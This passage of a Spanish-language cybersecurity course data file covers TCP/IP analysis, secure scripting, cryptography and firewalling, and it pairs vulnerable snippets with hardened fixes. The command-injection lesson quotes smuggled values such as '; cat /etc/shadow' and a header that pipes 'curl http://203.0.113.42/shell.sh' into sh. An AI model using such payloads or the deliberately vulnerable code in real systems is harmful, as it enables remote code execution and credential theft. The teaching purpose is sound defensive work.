        whenToUse: 'En el Paso 3 del laboratorio para demostrar la escalada a `EUID=0` y capturar la bandera.',
      },
      {
        command: 'chmod u-s /usr/local/bin/sysdiag',
        flagsBreakdown: '`u-s` retira el bit SUID del usuario propietario (equivale a `chmod 0755`).',
        whenToUse: 'En el Paso 4 para remediar la vulnerabilidad en vivo y verificar que la escalada queda neutralizada.',
      },
    ],
  },

  'mod-03': {
    moduleId: 'mod-03',
    competencyBadge: {
      code: 'CERT-03 · TCP-IP-PACKET-ANALYST',
      name: 'Analista de Protocolos TCP/IP y Disección de Tráfico PCAP',
      skillVerified: 'Cálculo de subredes CIDR, análisis de banderas TCP (SYN/ACK/RST) y extracción de credenciales en capturas PCAP.',
    },
    extendedSubModules: [
      {
        id: 'mod-03-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Encapsulamiento Paso a Paso: De los Datos de Aplicación a la Trama Ethernet',
        deepExplanation: [
          'Cuando un programa envía una petición por red, los datos descienden por la pila añadiendo cabeceras en cada capa (Encapsulamiento): en **Capa 7 (Aplicación)** se genera el mensaje HTTP, DNS o TLS; en **Capa 4 (Transporte)** el kernel añade la cabecera **TCP** (con Puerto Origen, Puerto Destino, Número de Secuencia `Seq`, Número de Acuse `Ack` y Banderas `SYN/ACK/FIN/RST/PSH`) o **UDP** (sin estado, usado en DNS `53/UDP` y QUIC).',
          'A continuación, en **Capa 3 (Red)** se antepone la cabecera **IPv4/IPv6** con la IP Origen, IP Destino y el campo `TTL` (Time To Live, que disminuye en 1 en cada router para evitar bucles infinitos). Finalmente, en **Capa 2 (Enlace)** la tarjeta de red envuelve el paquete en una **Trama Ethernet** con la dirección física **MAC Origen** y **MAC Destino** del siguiente salto en la red local.',
        ],
        keyTakeaways: [
          'Las direcciones **IP (Capa 3)** se mantienen de extremo a extremo; las direcciones **MAC (Capa 2)** cambian en cada salto de router.',
          'TCP garantiza orden y retransmisión mediante números `Seq` y `Ack`; UDP prioriza baja latencia sin handshake.',
          'El valor `TTL` inicial suele revelar la familia del sistema operativo (Linux ~64, Windows ~128).',
        ],
        codeOrCommandExample:
          '# Inspeccionar direcciones IP, máscaras CIDR y direcciones MAC de la estación:\nip a',
      },
      {
        id: 'mod-03-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Domina el Cálculo Rápido de Subredes CIDR (/24, /26, /28, /30)',
        deepExplanation: [
          'Una dirección IPv4 consta de **32 bits** divididos en 4 octetos de 8 bits (por ejemplo, `10.10.10.45`). La notación CIDR `/N` indica cuántos bits de izquierda a derecha identifican a la **Red**, dejando los **`32 - N` bits restantes** para numerar a los **Hosts (equipos)** dentro de esa subred.',
          'La fórmula universal para calcular cuántos equipos caben en cualquier subred es **`2^(32 - N) - 2`** (se restan siempre 2 direcciones: la primera dirección donde todos los bits de host son `0` es la **Dirección de Red**, y la última donde todos los bits de host son `1` es la **Dirección de Broadcast**). Así: en un `/24` quedan `32 - 24 = 8` bits (`2^8 - 2 = 254` hosts); en un `/26` quedan `6` bits (`2^6 - 2 = 62` hosts); en un `/28` quedan `4` bits (`2^4 - 2 = 14` hosts); y en un enlace punto a punto `/30` quedan `2` bits (`2^2 - 2 = 2` hosts).',
        ],
        keyTakeaways: [
          '`/24` (255.255.255.0) = 256 direcciones totales -> **254 hosts utilizables**.',
          '`/26` (255.255.255.192) = 64 direcciones totales -> **62 hosts utilizables**.',
          '`/30` (255.255.255.252) = 4 direcciones totales -> **2 hosts utilizables** (enlaces entre routers).',
        ],
        codeOrCommandExample:
          '# Escanear servicios activos en el host objetivo 10.10.10.45:\nnmap -sV 10.10.10.45',
      },
      {
        id: 'mod-03-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Anatomía de los Estados de un Puerto en Nmap: Open, Closed y Filtered',
        deepExplanation: [
          'Cuando ejecutas `nmap -sS` (TCP SYN Scan) hacia un puerto destino, Nmap envía un único paquete TCP con la bandera `[SYN]` activada y clasifica el estado del puerto según la respuesta exacta del kernel o firewall remoto:',
          '1. **`open` (Abierto):** El servidor responde con `[SYN, ACK]`. Nmap sabe inmediatamente que hay un proceso escuchando y envía `[RST]` para cerrar sin completar la conexión.\n2. **`closed` (Cerrado):** El paquete llega hasta el servidor, pero ningún programa escucha en ese puerto. La pila TCP del servidor responde inmediatamente con **`[RST, ACK]`**.\n3. **`filtered` (Filtrado):** Un firewall intermedio descarta silenciosamente el paquete (`DROP`) o devuelve un error ICMP Tipo 3 Código 13 (*Administratively Prohibited*). Nmap no recibe ni `SYN,ACK` ni `RST,ACK`.',
        ],
        keyTakeaways: [
          '`[SYN, ACK]` recibido -> Puerto **Abierto (`open`)**.',
          '`[RST, ACK]` recibido -> Puerto **Cerrado (`closed`)** (pero el host es alcanzable).',
          'Silencio (Timeout) -> Puerto **Filtrado (`filtered`)** por un firewall.',
        ],
        codeOrCommandExample:
          '# Leer el archivo de captura de paquetes mostrando el payload en ASCII:\ntcpdump -A -r captura_red.pcap',
      },
      {
        id: 'mod-03-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Seguridad en Capa 2 (ARP Spoofing vs. DAI) y Peligro de Protocolos en Texto Claro',
        deepExplanation: [
          'En una red local Ethernet, antes de enviar un paquete IP a `10.10.10.1`, tu equipo pregunta por difusión (*broadcast*): *"¿Quién tiene la IP 10.10.10.1?"* mediante el protocolo **ARP**. Como ARP fue diseñado en 1982 sin firmas ni autenticación, un atacante conectado a la misma VLAN puede enviar respuestas ARP falsas (*Gratuitous ARP*) diciendo que la IP del router tiene la dirección MAC del atacante (**ARP Spoofing / Man-in-the-Middle**).',
          'Si además las aplicaciones internas transmiten sesiones sobre protocolos sin cifrar (`HTTP`, `FTP`, `Telnet`), cualquier captura de tráfico con `tcpdump` o Wireshark expondrá las contraseñas y cabeceras `Authorization: Bearer` en texto plano. La defensa combina **DHCP Snooping + Dynamic ARP Inspection (DAI)** en los switches y **TLS 1.3 (HTTPS)** obligatorio incluso en redes internas.',
        ],
        keyTakeaways: [
          'ARP no valida identidad por defecto; mitígalo en switches empresariales con **DHCP Snooping + DAI**.',
          'Jamás transmitas tokens `Authorization: Bearer` o credenciales por HTTP plano, ni siquiera dentro de la LAN.',
        ],
        codeOrCommandExample:
          '# Consultar la tabla de resolución ARP (IP <-> Dirección MAC) del nodo:\narp -a',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Reconocimiento Activo',
        title: 'Sondeo de puertos y banners de versión con nmap -sV',
        technicalDetail: 'El analista interroga `10.10.10.45` e identifica un servicio HTTP interno escuchando en el puerto `8080/tcp` sin TLS.',
      },
      {
        phase: 'Fase 2 · Captura de Tráfico',
        title: 'Recolección de paquetes en tránsito en archivo .pcap',
        technicalDetail: 'Se inspecciona la captura `captura_red.pcap` que registró una sesión administrativa entre `10.10.14.2` y `10.10.10.45:8080`.',
      },
      {
        phase: 'Fase 3 · Disección en ASCII',
        title: 'Extracción del encabezado HTTP Authorization con tcpdump -A',
        technicalDetail: 'Al ejecutar `tcpdump -A -r captura_red.pcap`, las cabeceras HTTP se leen en claro y exponen el token `Authorization: Bearer FLAG{...}`.',
      },
      {
        phase: 'Fase 4 · Cifrado y Capa 2',
        title: 'Migración a TLS 1.3 (mTLS) + Dynamic ARP Inspection (DAI)',
        technicalDetail: 'Se deshabilita HTTP en texto claro forzando TLS 1.3 con ECDHE y se activa DAI en los switches para impedir intercepciones en Capa 2.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Transmisión de Tokens de Autenticación en Microservicios Internos',
      context: 'Un servicio interno consulta el endpoint administrativo `/api/v1/admin/status` dentro de la red corporativa.',
      vulnerableLabel: 'INSEGURO · Petición HTTP en texto claro (Puerto 8080)',
      vulnerableSnippet:
        'GET /api/v1/admin/status HTTP/1.1\nHost: 10.10.10.45:8080\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n# Visible íntegramente con: tcpdump -A -r captura_red.pcap',
      vulnerableWhyItFails:
        'Al viajar sobre HTTP sin cifrar, cualquier nodo en el camino de red o captura PCAP lee el token Bearer completo y permite secuestrar la sesión.',
      secureLabel: 'SEGURO (HARDENED) · TLS 1.3 con HSTS y mTLS entre servicios',
      secureSnippet:
        '# Configuración Nginx con TLS 1.3 obligatorio:\nserver {\n    listen 443 ssl http2;\n    ssl_protocols TLSv1.3;\n    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;\n}',
      secureWhyItWorks:
        'Con TLS 1.3 todo el payload HTTP (incluidas las cabeceras `Authorization` y las cookies) viaja cifrado con AEAD (`AES-256-GCM`), por lo que `tcpdump` solo ve bytes opacos.',
    },
    commandCheatSheet: [
      {
        command: 'nmap -sV 10.10.10.45',
        flagsBreakdown: '`-sV` sondea los puertos abiertos para determinar el servicio exacto y su versión.',
        whenToUse: 'Primera fase de auditoría de red para inventariar qué servicios expone un servidor.',
      },
      {
        command: 'tcpdump -A -r captura_red.pcap',
        flagsBreakdown: '`-A` imprime cada paquete en texto ASCII; `-r` lee desde un archivo `.pcap` guardado.',
        whenToUse: 'Para inspeccionar capturas de red en consola y buscar credenciales o comandos en texto claro.',
      },
      {
        command: 'arp -a',
        flagsBreakdown: '`-a` muestra todas las entradas de la caché ARP actual (asociación IP <-> MAC).',
        whenToUse: 'Para verificar los equipos vecinos en el segmento local y detectar posibles duplicados MAC (ARP Spoofing).',
      },
      {
        command: 'ip a',
        flagsBreakdown: 'Abreviatura de `ip address show`; lista interfaces, IPs y máscaras CIDR.',
        whenToUse: 'Para conocer la dirección IP y subred de tu propia estación de trabajo.',
      },
    ],
  },

  'mod-04': {
    moduleId: 'mod-04',
    competencyBadge: {
      code: 'CERT-04 · SECURE-AUTOMATION',
      name: 'Ingeniero de Automatización Segura en Python y Bash',
      skillVerified: 'Procesamiento de logs con tuberías POSIX (grep/awk/sort/uniq), modo estricto Bash y prevención de Command Injection en Python.',
    },
    extendedSubModules: [
      {
        id: 'mod-04-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Por qué `set -euo pipefail` es Obligatorio en Todo Script de Seguridad en Bash',
        deepExplanation: [
          'Por defecto, Bash tiene un comportamiento peligroso para scripts de producción o respuesta a incidentes: si un comando en la línea 5 falla, Bash ignora el error y sigue ejecutando la línea 6; si escribes mal el nombre de una variable (`rm -rf $DIRECTORIO_TEMPORAL/` cuando estaba vacía), la expande a una cadena vacía; y en una tubería `cmd1 | cmd2 | cmd3`, solo importa el código de salida del último comando.',
          'Al declarar **`set -euo pipefail`** en la segunda línea de tu script: **`-e` (`errexit`)** detiene el script en el instante en que un comando devuelve un código distinto de 0; **`-u` (`nounset`)** aborta si intentas usar una variable no definida; y **`-o pipefail`** hace que toda una tubería falle si cualquiera de sus pasos intermedios falla.',
        ],
        keyTakeaways: [
          '`-e`: aborta ante cualquier comando con `exitCode != 0`.',
          '`-u`: impide que variables vacías o con errores tipográficos causen desastres.',
          '`-o pipefail`: propaga errores ocurridos en cualquier eslabón de un pipeline `|`.',
        ],
        codeOrCommandExample:
          '#!/usr/bin/env bash\nset -euo pipefail\n\ngrep "Failed password" auth.log | awk \'{print $11}\' | sort | uniq -c',
      },
      {
        id: 'mod-04-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Dominio del Pipeline de Triaje Forense: grep -> awk -> sort -> uniq -c',
        deepExplanation: [
          'Cuando un servidor recibe miles de intentos de intrusión por minuto, abrir un archivo de log en un editor gráfico es inviable. Los ingenieros de SOC dominan el pipeline de cuatro etapas en consola:',
          '1. **`grep "Failed password" auth.log`**: filtra únicamente las líneas que contienen fallos de contraseña.\n2. **`awk \'{print $11}\'`**: divide cada línea por espacios en blanco e imprime exclusivamente la columna 11 (donde `sshd` registra la dirección IP origen).\n3. **`sort`**: ordena todas las direcciones IP idénticas para que queden juntas (requisito obligatorio porque `uniq` solo agrupa líneas adyacentes).\n4. **`uniq -c`**: colapsa las IPs repetidas y antepone el número exacto de veces que apareció cada una.',
        ],
        keyTakeaways: [
          '`uniq -c` requiere siempre ejecutar `sort` antes, ya que solo compara líneas consecutivas.',
          '`awk \'{print $N}\'` extrae la columna N; `$0` representa toda la línea y `$NF` la última columna.',
        ],
        codeOrCommandExample:
          'grep "Failed password" auth.log | awk \'{print $11}\' | sort | uniq -c',
      },
      {
        id: 'mod-04-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Anatomía de Command Injection en Python: `shell=True` vs. `shell=False`',
        deepExplanation: [
          'Muchas herramientas de seguridad necesitan invocar binarios del sistema desde Python (por ejemplo, llamar a `ping`, `nmap` o `openssl`). Si usas `os.system("ping -c 1 " + ip)` o `subprocess.run(f"ping -c 1 {ip}", shell=True)`, Python lanza un intérprete `/bin/sh -c` y le pasa toda la cadena. Si un atacante introduce como IP el valor `10.10.10.45; id`, el shell ejecuta el `ping` y acto seguido ejecuta `id` (Ejecución Remota de Comandos — **CWE-78**).',
          'En cambio, cuando pasas una **lista de argumentos** con **`subprocess.run(["ping", "-c", "1", ip], shell=False, check=True, timeout=5)`**, Python invoca directamente la llamada al sistema `execve()` del kernel sin abrir ningún shell `/bin/sh`. Los caracteres `;`, `|`, `&&` o `` ` `` dejan de tener significado especial y son tratados como un simple argumento literal que `ping` rechazará como host inválido.',
        ],
        keyTakeaways: [
          'Prohibido usar `os.system()`, `eval()`, `exec()` o `subprocess` con `shell=True` sobre datos externos.',
          'Usa siempre `subprocess.run(["binario", "arg1", variable], shell=False, timeout=5)`.',
        ],
        codeOrCommandExample:
          'import subprocess\n# Ejecución segura inmune a inyección de metacaracteres de shell:\nsubprocess.run(["ping", "-c", "1", target_ip], shell=False, check=True, timeout=5)',
      },
      {
        id: 'mod-04-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Programación de Sockets TCP en Python con Control de Timeouts y Excepciones',
        deepExplanation: [
          'El módulo estándar `socket` de Python permite construir escáneres de puertos y clientes de auditoría personalizados a medida. Sin embargo, un error clásico es crear un socket sin establecer `settimeout()` o capturar excepciones con un bloque vacío `except: pass`.',
          'Si conectas a un puerto filtrado por un firewall sin `s.settimeout(2.0)`, tu script quedará bloqueado esperando indefinidamente el timeout del sistema operativo (~120 segundos). Además, usar `except Exception as err:` registrando el tipo de fallo (`socket.timeout` vs `ConnectionRefusedError`) te permite distinguir si el puerto está filtrado o cerrado.',
        ],
        keyTakeaways: [
          'Configura siempre `s.settimeout(2.0)` antes de llamar a `s.connect()` o `s.recv()`.',
          'Nunca uses `except: pass`; captura excepciones específicas para no ocultar fallos críticos.',
        ],
        codeOrCommandExample:
          'import socket\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.settimeout(2.0)\n    s.connect(("10.10.10.45", 22))',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Ingesta de Logs',
        title: 'Inspección inicial del archivo auth.log con grep',
        technicalDetail: 'El analista filtra los eventos `Failed password` en el recolector SIEM para aislar los intentos de autenticación fallidos.',
      },
      {
        phase: 'Fase 2 · Extracción de Columna',
        title: 'Recorte de la dirección IP atacante mediante awk',
        technicalDetail: 'Se encadena `| awk \'{print $11}\'` para aislar únicamente el campo de la dirección IP origen (`203.0.113.42`).',
      },
      {
        phase: 'Fase 3 · Agregación Estadística',
        title: 'Ordenamiento y conteo con sort | uniq -c',
        technicalDetail: 'El pipeline completo cuenta el volumen exacto de intentos por IP y entrega la bandera de automatización verificada.',
      },
      {
        phase: 'Fase 4 · Blindaje del Script',
        title: 'Validación estática en el Analizador Python/Bash (shell=False + set -euo pipefail)',
        technicalDetail: 'Se verifica que los scripts de respuesta automática no sean vulnerables a inyección de comandos al procesar IPs o cabeceras de logs.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Automatización de Respuesta a Incidentes en Python (Prevención de CWE-78 Command Injection)',
      context: 'Un script SOAR bloquea o verifica automáticamente direcciones IP extraídas de los logs de acceso web.',
      vulnerableLabel: 'VULNERABLE · Concatenación con shell=True (Permite inyectar `; komando`)',
      vulnerableSnippet:
        'import subprocess\n\ndef verificar_host(ip_extraida_del_log: str):\n    # VULNERABLE: si ip_extraida_del_log vale "10.10.10.1; cat /etc/shadow", se ejecuta en sh\n    cmd = f"ping -c 1 {ip_extraida_del_log}"\n    subprocess.run(cmd, shell=True)',
      vulnerableWhyItFails:
        'Un atacante puede enviar un encabezado `X-Forwarded-For: 127.0.0.1; curl http://203.0.113.42/shell.sh | sh` en el log y ejecutar código en el servidor SOAR.',
      secureLabel: 'SEGURO (HARDENED) · Lista de argumentos con shell=False y validación IP',
      secureSnippet:
        'import ipaddress\nimport subprocess\n\ndef verificar_host(ip_extraida_del_log: str):\n    ip_valida = str(ipaddress.ip_address(ip_extraida_del_log.strip()))\n    subprocess.run(["ping", "-c", "1", ip_valida], shell=False, check=True, timeout=3)',
      secureWhyItWorks:
        '`ipaddress.ip_address()` valida matemáticamente que sea una IP real, y `shell=False` con lista de argumentos ejecuta `/bin/ping` vía `execve` sin pasar por `/bin/sh`.',
    },
    commandCheatSheet: [
      {
        command: 'grep "Failed password" auth.log',
        flagsBreakdown: 'Busca el patrón exacto `"Failed password"` dentro del archivo `auth.log`.',
        whenToUse: 'Para localizar rápidamente intentos fallidos de inicio de sesión SSH.',
      },
      {
        command: "grep \"Failed password\" auth.log | awk '{print $11}' | sort | uniq -c",
        flagsBreakdown: '`awk` extrae la columna 11 (IP); `sort` agrupa iguales; `uniq -c` cuenta ocurrencias.',
        whenToUse: 'En el Paso 3 del laboratorio para obtener el ranking de IPs atacantes y capturar la bandera.',
      },
      {
        command: 'set -euo pipefail',
        flagsBreakdown: '`-e` salir en error; `-u` error en variable no definida; `-o pipefail` error en tuberías.',
        whenToUse: 'Al principio de cualquier script Bash profesional (puedes probarlo en la pestaña Analizador Estático).',
      },
    ],
  },

  'mod-05': {
    moduleId: 'mod-05',
    competencyBadge: {
      code: 'CERT-05 · APPLIED-CRYPTO-STRIDE',
      name: 'Arquitecto de Criptografía Aplicada y Modelado STRIDE',
      skillVerified: 'Auditoría de esquemas AEAD (AES-256-GCM), hashing de contraseñas con Argon2id, TLS 1.3 Forward Secrecy y análisis de amenazas STRIDE.',
    },
    extendedSubModules: [
      {
        id: 'mod-05-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Por qué el Modo ECB es Inseguro y Cómo Funciona el Cifrado Autenticado AEAD (AES-GCM)',
        deepExplanation: [
          'El algoritmo AES cifra bloques de 128 bits (16 bytes). Si utilizas el modo antiguo **AES-ECB (Electronic Codebook)**, cada bloque idéntico de texto plano produce exactamente el mismo bloque cifrado, revelando patrones visuales y permitiendo que un atacante recorte o reordene bloques sin que el receptor lo detecte.',
          'En sistemas modernos es obligatorio utilizar **Cifrado Autenticado con Datos Asociados (AEAD)**, siendo los dos estándares de la industria **AES-256-GCM (Galois/Counter Mode)** y **ChaCha20-Poly1305**. Un esquema AEAD genera tanto el texto cifrado como una **Etiqueta de Autenticación Criptográfica (Authentication Tag / MAC de 128 bits)**. Si alguien modifica un solo bit del mensaje cifrado en tránsito, la verificación del Tag falla antes de descifrar y el paquete se descarta inmediatamente.',
        ],
        keyTakeaways: [
          'Prohibido usar `AES-ECB` (revela patrones) o `AES-CBC` sin HMAC (vulnerable a ataques de *Padding Oracle*).',
          'Usa siempre **AEAD (`AES-256-GCM` o `ChaCha20-Poly1305`)**: confidencialidad + integridad en un solo paso.',
          'Jamás reutilices el mismo **Nonce (Number used once, 96 bits)** con la misma clave en AES-GCM.',
        ],
        codeOrCommandExample:
          '# Auditar la política criptográfica activa del servidor:\ncat /etc/crypto-policies/config',
      },
      {
        id: 'mod-05-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Almacenamiento de Contraseñas: Por qué SHA-256 no sirve y Cómo protege Argon2id',
        deepExplanation: [
          'Un error frecuente es pensar que guardar contraseñas con `SHA-256` es seguro. `SHA-256` fue diseñado para ser **extremadamente rápido** en hardware: una tarjeta gráfica moderna puede calcular más de **20.000 millones de hashes SHA-256 por segundo**, permitiendo romper contraseñas de 8 caracteres en minutos mediante fuerza bruta o tablas precomputadas (*Rainbow Tables*).',
          'Para almacenar contraseñas debemos usar funciones de derivación **deliberadamente lentas y costosas en memoria RAM (Memory-Hard KDF)** acompañadas de un **Salt aleatorio único por usuario (16 bytes)**. El estándar ganador de la Password Hashing Competition es **Argon2id** (seguido de `yescrypt` en `/etc/shadow` de Linux modernos, `scrypt` y `bcrypt`). Al exigir por ejemplo 64 MB de RAM por cada intento (`m=65536`), Argon2id neutraliza la ventaja de paralelismo de las GPUs y ASICs.',
        ],
        keyTakeaways: [
          '`SHA-256` / `SHA-3` / `BLAKE3` se usan para verificar integridad de archivos, NUNCA para contraseñas solas.',
          'Para contraseñas usa **Argon2id** (con Salt aleatorio único, memoria `m=64MB`, iteraciones `t=3`).',
        ],
        codeOrCommandExample:
          '# Verificar el hash SHA-256 de integridad de un archivo en disco:\nsha256sum artefacto_sospechoso.bin',
      },
      {
        id: 'mod-05-ext-3',
        lessonNumber: 'Lección 5',
        title: 'TLS 1.3 y Perfect Forward Secrecy (PFS) con ECDHE',
        deepExplanation: [
          'En versiones antiguas de TLS sin Forward Secrecy, si un adversario grababa todo el tráfico cifrado de tu empresa hoy y dentro de dos años lograba robar la clave privada del certificado del servidor (`.key`), podía descifrar retroactivamente todas las conversaciones pasadas.',
          '**TLS 1.3 (RFC 8446)** elimina todos los algoritmos heredados inseguros y hace obligatorio el intercambio de claves efímero **ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)**. En cada nueva conexión, cliente y servidor generan un par de claves temporales en memoria RAM que se destruyen al cerrar la sesión. Así, aunque la clave privada del servidor sea comprometida en el futuro, es matemáticamente imposible descifrar las sesiones capturadas en el pasado (**Perfect Forward Secrecy**).',
        ],
        keyTakeaways: [
          'TLS 1.3 exige **Forward Secrecy (ECDHE)** en todas las sesiones.',
          'La clave privada del certificado en TLS 1.3 solo se usa para **firmar** la identidad en el handshake, nunca para cifrar la clave de sesión.',
        ],
        codeOrCommandExample:
          'cat /etc/crypto-policies/config',
      },
      {
        id: 'mod-05-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Modelado de Amenazas Arquitectónico con la Matriz STRIDE',
        deepExplanation: [
          'Antes de escribir una sola línea de código, los equipos de Ingeniería de Seguridad aplican **Modelado de Amenazas con STRIDE** sobre el diagrama de arquitectura del sistema. Cada letra corresponde a una familia de ataque y al control criptográfico o arquitectónico que la mitiga:',
          '- **S — Spoofing (Suplantación de identidad):** Mitigado con Autenticación Fuerte (MFA, mTLS, firmas Ed25519).\n- **T — Tampering (Manipulación de datos):** Mitigado con Integridad Criptográfica (AEAD AES-GCM, HMAC, SHA-256).\n- **R — Repudiation (Repudio de acciones):** Mitigado con Logs inmutables y firmas digitales.\n- **I — Information Disclosure (Fuga de información):** Mitigado con Cifrado en tránsito (TLS 1.3) y en reposo.\n- **D — Denial of Service (Denegación de servicio):** Mitigado con Rate Limiting, cuotas y CDN/WAF.\n- **E — Elevation of Privilege (Escalada de privilegios):** Mitigado con RBAC estricto, sandboxing y mínimo privilegio.',
        ],
        keyTakeaways: [
          'STRIDE conecta cada amenaza de diseño con su propiedad defensiva exacta.',
          'Combina siempre STRIDE con una arquitectura **Zero Trust (NIST SP 800-207)**: verificar explícitamente cada petición.',
        ],
        codeOrCommandExample:
          'cat /etc/crypto-policies/config',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Diseño Débil',
        title: 'Uso de algoritmos obsoletos (MD5/SHA1 para claves o AES-ECB sin autenticación)',
        technicalDetail: 'Un servicio legado almacena hashes sin salt o cifra tokens sin etiqueta de integridad (MAC/Tag).',
      },
      {
        phase: 'Fase 2 · Auditoría de Política',
        title: 'Inspección de /etc/crypto-policies/config en el nodo colector',
        technicalDetail: 'El auditor revisa la configuración criptográfica del sistema para verificar qué suites TLS, cifradores AEAD y funciones KDF están habilitadas.',
      },
      {
        phase: 'Fase 3 · Verificación de Integridad',
        title: 'Cálculo de huella SHA-256 y validación de política Zero Trust',
        technicalDetail: 'Se comprueba que la política exige `TLS1.3`, `AES-256-GCM:CHACHA20-POLY1305` y `Argon2id`, obteniendo la bandera criptográfica.',
      },
      {
        phase: 'Fase 4 · Estándar en Producción',
        title: 'Adopción de AEAD + Argon2id + Rotación de Claves con KMS/HSM',
        technicalDetail: 'Todas las contraseñas migran a Argon2id con salt único y los secretos de aplicación se cifran con AES-256-GCM gestionado por HSM/KMS.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Almacenamiento de Contraseñas de Usuarios en Backend de Autenticación',
      context: 'Servicio de registro y login de usuarios en una plataforma financiera.',
      vulnerableLabel: 'VULNERABLE · Hash rápido SHA-256 sin Salt (Vulnerable a GPU Cracking)',
      vulnerableSnippet:
        'import hashlib\n\ndef crear_hash_inseguro(password: str) -> str:\n    # PELIGRO: SHA-256 sin salt permite probar 20.000 millones de claves/s en GPU\n    return hashlib.sha256(password.encode("utf-8")).hexdigest()',
      vulnerableWhyItFails:
        'Dos usuarios con la misma contraseña tendrán el mismo hash exacto, y un atacante con una GPU comercial puede revertir millones de hashes en segundos.',
      secureLabel: 'SEGURO (HARDENED) · Argon2id Memory-Hard con Salt Criptográfico Único',
      secureSnippet:
        'from argon2 import PasswordHasher\n\n# Configura 64 MB de RAM (memory_cost=65536), 3 iteraciones y 4 hilos:\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash_seguro = ph.hash(password)  # Incluye salt aleatorio único automáticamente',
      secureWhyItWorks:
        'Argon2id genera un salt criptográfico aleatorio de 128 bits por cada usuario y exige 64 MB de memoria RAM por intento, haciendo inviable el crackeo masivo en GPUs.',
    },
    commandCheatSheet: [
      {
        command: 'cat /etc/crypto-policies/config',
        flagsBreakdown: 'Inspecciona el archivo de políticas criptográficas del sistema.',
        whenToUse: 'En el Paso 3 del laboratorio para verificar el uso de TLS 1.3, AES-256-GCM y Argon2id y capturar la bandera.',
      },
      {
        command: 'sha256sum artefacto_sospechoso.bin',
        flagsBreakdown: 'Calcula el resumen criptográfico SHA-256 (256 bits / 64 caracteres hexadecimales).',
        whenToUse: 'Para comprobar que un archivo o evidencia no ha sido alterado (Integridad / Anti-Tampering).',
      },
    ],
  },

  'mod-06': {
    moduleId: 'mod-06',
    competencyBadge: {
      code: 'CERT-06 · NETWORK-DEFENSE-IPS',
      name: 'Especialista en Cortafuegos Netfilter, IDS/IPS Suricata y Segmentación',
      skillVerified: 'Diseño de reglas de firewall stateful (First Match Wins), Egress Filtering y detección/bloqueo con Suricata IPS.',
    },
    extendedSubModules: [
      {
        id: 'mod-06-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Arquitectura Interna de Netfilter en el Kernel Linux: Cadenas INPUT, OUTPUT y FORWARD',
        deepExplanation: [
          'Tanto `ufw` como `iptables` y `nftables` son interfaces de usuario que configuran el mismo motor dentro del kernel Linux: **Netfilter**. Para dominar la seguridad de red debes entender sus tres ganchos (*hooks*) principales de filtrado:',
          '1. **`INPUT`**: filtra todos los paquetes que vienen desde la red y cuyo destino final es un proceso local de este mismo servidor.\n2. **`OUTPUT`**: filtra todos los paquetes generados por procesos locales de este servidor que intentan salir hacia la red (**Egress Filtering**).\n3. **`FORWARD`**: filtra paquetes que atraviesan este servidor cuando actúa como router o gateway entre dos subredes.',
        ],
        keyTakeaways: [
          'Netfilter evalúa las reglas de cada cadena **de arriba hacia abajo: la primera regla que coincide gana (`First Match Wins`)**.',
          'La política por defecto (`Default Policy`) profesional en `INPUT` y `FORWARD` debe ser siempre **`DROP` (Denegar todo lo no permitido explícitamente)**.',
        ],
        codeOrCommandExample:
          '# Bloquear inmediatamente todo el tráfico proveniente de la IP atacante 203.0.113.42:\nufw deny from 203.0.113.42 to any',
      },
      {
        id: 'mod-06-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Firewall Stateful (`conntrack`) y Por qué el Egress Filtering Detiene Reverse Shells',
        deepExplanation: [
          'Un firewall moderno es **Stateful (con seguimiento de estado mediante `nf_conntrack`)**: recuerda qué conexiones TCP fueron iniciadas legítimamente y permite los paquetes de respuesta (`ESTABLISHED, RELATED`). Sin embargo, muchos administradores solo filtran la entrada (`INPUT`) y dejan la salida (`OUTPUT`) completamente abierta (`ALLOW ALL`).',
          'Cuando un atacante explota una vulnerabilidad web, rara vez puede conectarse a un puerto nuevo del servidor porque el firewall bloquea la entrada. En su lugar, hace que el servidor comprometido inicie una **Reverse Shell saliente** hacia el servidor C2 del atacante en Internet (por ejemplo `203.0.113.42:4444`). Si aplicas **Egress Filtering (Filtrado de Salida)** permitiendo que el servidor solo salga hacia su DNS e infraestructura interna autorizada, la Reverse Shell fracasa instantáneamente.',
        ],
        keyTakeaways: [
          'Bind Shell (entrante) es bloqueada por reglas `INPUT`; Reverse Shell (saliente) solo se detiene con **Egress Filtering (`OUTPUT`)**.',
          'Al bloquear una IP maliciosa en vivo, recuerda que las sesiones ya abiertas en `conntrack` deben cerrarse.',
        ],
        codeOrCommandExample:
          '# Identificar la IP atacante en auth.log y bloquearla en el firewall:\ngrep "Failed password" auth.log\nufw deny from 203.0.113.42 to any',
      },
      {
        id: 'mod-06-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Anatomía de una Regla de Suricata IDS/IPS y Diferencia con Zeek (NSM)',
        deepExplanation: [
          'Mientras un firewall de Capa 4 decide basándose en IPs y puertos (`10.10.10.80:443`), un sistema **IDS/IPS como Suricata** reconstruye el flujo y analiza el contenido de **Capa 7 (Deep Packet Inspection)**. Una regla de Suricata consta de tres partes: **Acción (`alert`, `drop`, `reject`)**, **Cabecera (`protocolo IP_origen Puerto -> IP_destino Puerto`)** y **Opciones entre paréntesis (`msg`, `flow`, `http.uri`, `content`, `sid`, `rev`)**.',
